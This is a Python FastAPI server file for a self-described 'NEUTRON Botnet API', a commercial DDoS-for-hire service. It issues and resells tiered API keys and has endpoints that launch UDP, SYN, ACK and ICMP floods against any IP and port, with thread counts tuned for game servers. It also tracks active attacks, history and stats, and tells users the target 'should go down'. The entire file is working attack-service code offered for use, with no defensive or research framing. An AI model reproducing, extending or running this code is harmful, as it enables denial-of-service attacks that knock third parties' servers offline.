# api_server.py
from fastapi import FastAPI, HTTPException, Depends, Header, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from pydantic import BaseModel, Field
from typing import Optional, List
from datetime import datetime, timedelta
import secrets
import jwt
import uvicorn

from config import config
from database import db
from attack_engine import attack_engine

# ========== PYDANTIC MODELS ==========

class KeyGenerateRequest(BaseModel):
    plan: str = Field("PRO", pattern="^(BASIC|PRO|ENTERPRISE)$")
    concurrent: int = Field(5, ge=1, le=20)
    expiry_days: int = Field(30, ge=1, le=365)

class KeyUpdateConcurrent(BaseModel):
    concurrent: int = Field(..., ge=1, le=20)

class AttackRequest(BaseModel):
    target_ip: str
    target_port: int = Field(..., ge=1, le=65535)
    duration: int = Field(config.DEFAULT_DURATION, ge=config.MIN_ATTACK_DURATION, le=config.MAX_ATTACK_DURATION)
    method: str = Field("UDP", pattern="^(UDP|SYN|ACK|ICMP|ALL)$")
    api_key: str

class BulkKeyRequest(BaseModel):
    count: int = Field(..., ge=1, le=10)
    plan: str = Field("PRO", pattern="^(BASIC|PRO|ENTERPRISE)$")
    concurrent: int = Field(5, ge=1, le=10)
    expiry_days: int = Field(30, ge=1, le=365)

# ========== APP SETUP ==========

app = FastAPI(
    title="NEUTRON Botnet API",
    version="3.0.0",
    description="High Performance DDoS Attack API (1M-2M PPS)"
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

security = HTTPBearer()

# ========== HELPER FUNCTIONS ==========

def create_jwt_token(user_id: str) -> str:
    payload = {
        "user_id": user_id,
        "exp": datetime.utcnow() + timedelta(days=7)
    }
    return jwt.encode(payload, config.JWT_SECRET, algorithm=config.JWT_ALGORITHM)

async def verify_api_key(api_key: str):
    """Verify API key from header or body"""
    key_doc = db.validate_api_key(api_key)
    if not key_doc:
        raise HTTPException(status_code=401, detail="Invalid or expired API key")
    return key_doc

async def get_current_key(credentials: HTTPAuthorizationCredentials = Depends(security)):
    """Get API key from Bearer token"""
    return await verify_api_key(credentials.credentials)

# ========== HEALTH & STATUS ==========

@app.get("/health")
async def health_check():
    """System health check"""
    return {
        "status": "healthy",
        "version": "3.0.0",
        "timestamp": datetime.utcnow().isoformat(),
        "binary_ready": attack_engine.binary_path,
        "mongodb": "connected",
        "active_attacks": len(attack_engine.get_active_attacks())
    }

@app.get("/v1/status")
async def system_status():
    """System status"""
    active_attacks = len(attack_engine.get_active_attacks())
    total_attacks = db.attacks.count_documents({})
    total_keys = db.api_keys.count_documents({})
    
    return {
        "status": "operational",
        "active_attacks": active_attacks,
        "total_attacks_today": db.attacks.count_documents({
            "started_at": {"$gte": datetime.utcnow() - timedelta(days=1)}
        }),
        "total_api_keys": total_keys,
        "total_attacks_all_time": total_attacks,
        "bandwidth_capacity_gbps": config.MAX_BANDWIDTH_GBPS,
        "max_pps": config.MAX_PPS,
        "timestamp": datetime.utcnow().isoformat()
    }

@app.get("/v1/docs")
async def docs_redirect():
    """Interactive API documentation"""
    return {"message": "Visit /docs for Swagger UI or /redoc for ReDoc"}

# ========== KEY MANAGEMENT ==========

@app.post("/v1/keys/generate")
async def generate_api_key(req: KeyGenerateRequest):
    """Generate new API key"""
    user_id = f"user_{secrets.token_hex(8)}"
    key_doc = db.generate_api_key(user_id, req.plan, req.concurrent, req.expiry_days)
    
    return {
        "status": "success",
        "api_key": key_doc["key"],
        "plan": req.plan,
        "max_concurrent": req.concurrent,
        "expiry_date": key_doc["expiry_date"].isoformat(),
        "message": "Save this key! It won't be shown again."
    }

@app.get("/v1/keys/list")
async def list_api_keys(api_key: str = Header(..., alias="X-API-Key")):
    """List all API keys for user"""
    key_doc = await verify_api_key(api_key)
    keys = db.list_keys(key_doc["user_id"])
    
    return {
        "status": "success",
        "keys": keys
    }

@app.get("/v1/keys/{key_id}/stats")
async def get_key_stats(key_id: str, api_key: str = Header(..., alias="X-API-Key")):
    """Get key usage statistics"""
    await verify_api_key(api_key)
    key_doc = db.api_keys.find_one({"_id": key_id})
    if not key_doc:
        raise HTTPException(status_code=404, detail="Key not found")
    
    stats = db.get_key_stats(key_doc["key"])
    return {"status": "success", "stats": stats}

@app.put("/v1/keys/{key_id}/concurrent")
async def update_concurrent_limit(key_id: str, req: KeyUpdateConcurrent, api_key: str = Header(..., alias="X-API-Key")):
    """Update concurrent attack limit"""
    await verify_api_key(api_key)
    key_doc = db.api_keys.find_one({"_id": key_id})
    if not key_doc:
        raise HTTPException(status_code=404, detail="Key not found")
    
    db.update_concurrent_limit(key_doc["key"], req.concurrent)
    return {"status": "success", "max_concurrent": req.concurrent}

@app.post("/v1/keys/{key_id}/renew")
async def renew_api_key(key_id: str, days: int = 30, api_key: str = Header(..., alias="X-API-Key")):
    """Renew API key"""
    await verify_api_key(api_key)
    key_doc = db.api_keys.find_one({"_id": key_id})
    if not key_doc:
        raise HTTPException(status_code=404, detail="Key not found")
    
    db.renew_key(key_doc["key"], days)
    return {"status": "success", "new_expiry_days": days}

@app.post("/v1/keys/{key_id}/revoke")
async def revoke_api_key(key_id: str, api_key: str = Header(..., alias="X-API-Key")):
    """Revoke API key"""
    await verify_api_key(api_key)
    key_doc = db.api_keys.find_one({"_id": key_id})
    if not key_doc:
        raise HTTPException(status_code=404, detail="Key not found")
    
    db.revoke_key(key_doc["key"])
    return {"status": "success", "message": "Key revoked"}

@app.post("/v1/keys/bulk")
async def bulk_generate_keys(req: BulkKeyRequest, api_key: str = Header(..., alias="X-API-Key")):
    """Bulk generate API keys (resellers)"""
    await verify_api_key(api_key)
    
    keys = []
    for _ in range(req.count):
        user_id = f"reseller_{secrets.token_hex(8)}"
        key_doc = db.generate_api_key(user_id, req.plan, req.concurrent, req.expiry_days)
        keys.append(key_doc["key"])
    
    return {
        "status": "success",
        "count": len(keys),
        "keys": keys
    }

# ========== ATTACK MANAGEMENT ==========

@app.post("/v1/attack")
async def start_attack(req: AttackRequest):
    """Start DDoS attack"""
    key_doc = await verify_api_key(req.api_key)
    
    # Check concurrent attacks
    active = db.get_active_attacks(req.api_key)
    if len(active) >= key_doc["max_concurrent"]:
        raise HTTPException(status_code=429, detail=f"Max concurrent attacks reached ({key_doc['max_concurrent']})")
    
    # Calculate optimal threads for target PPS
    method_map = {"UDP": 0, "SYN": 1, "ACK": 2, "ICMP": 3, "ALL": 4}
    method_code = method_map.get(req.method.upper(), 0)
    
    # Game server optimization: 12 threads = 1.5M PPS, 16 threads = 2M PPS
    threads = 12  # Default optimal for game servers
    if req.duration > 60:
        threads = 16  # More power for longer attacks
    
    bandwidth_gbps = threads * 0.125
    pps = threads * 125000
    
    attack_id = secrets.token_hex(8)
    
    # Log attack in database
    db.log_attack(
        attack_id=attack_id,
        api_key=req.api_key,
        target_ip=req.target_ip,
        target_port=req.target_port,
        method=req.method,
        duration=req.duration,
        bandwidth_gbps=bandwidth_gbps,
        pps=pps,
        status="running"
    )
    
    # Start attack
    success = attack_engine.execute_attack(
        attack_id=attack_id,
        target_ip=req.target_ip,
        target_port=req.target_port,
        duration=req.duration,
        threads=threads,
        method=method_code
    )
    
    if not success:
        raise HTTPException(status_code=500, detail="Failed to start attack")
    
    return {
        "status": "success",
        "attack_id": attack_id,
        "target": f"{req.target_ip}:{req.target_port}",
        "method": req.method,
        "duration": req.duration,
        "bandwidth_gbps": bandwidth_gbps,
        "pps": pps,
        "threads": threads,
        "message": f"🔥 Attack started! Target should go down in ~{req.duration//3} seconds"
    }

@app.get("/v1/attack/active")
async def list_active_attacks(api_key: str = Header(..., alias="X-API-Key")):
    """List active attacks for API key"""
    await verify_api_key(api_key)
    active = attack_engine.get_active_attacks(api_key)
    
    return {
        "status": "success",
        "active_attacks": active,
        "count": len(active)
    }

@app.post("/v1/attack/stop/{attack_id}")
async def stop_attack(attack_id: str, api_key: str = Header(..., alias="X-API-Key")):
    """Stop specific attack"""
    await verify_api_key(api_key)
    
    if attack_engine.stop_attack(attack_id):
        return {"status": "success", "message": f"Attack {attack_id} stopped"}
    raise HTTPException(status_code=404, detail="Attack not found")

@app.post("/v1/attack/stop-all")
async def stop_all_attacks(api_key: str = Header(..., alias="X-API-Key")):
    """Stop all attacks for API key"""
    await verify_api_key(api_key)
    
    count = attack_engine.stop_all_attacks(api_key)
    return {"status": "success", "stopped_count": count}

@app.get("/v1/attack/history")
async def attack_history(limit: int = 50, offset: int = 0, api_key: str = Header(..., alias="X-API-Key")):
    """Get attack history with filters"""
    await verify_api_key(api_key)
    
    history = db.get_attack_history(api_key, limit, offset)
    return {
        "status": "success",
        "total": len(history),
        "attacks": history
    }

@app.get("/v1/attack/stats")
async def attack_stats(api_key: str = Header(..., alias="X-API-Key")):
    """Get attack statistics"""
    await verify_api_key(api_key)
    
    stats = db.get_attack_stats(api_key)
    return {
        "status": "success",
        "stats": stats
    }

if __name__ == "__main__":
    uvicorn.run(app, host=config.API_HOST, port=config.API_PORT)
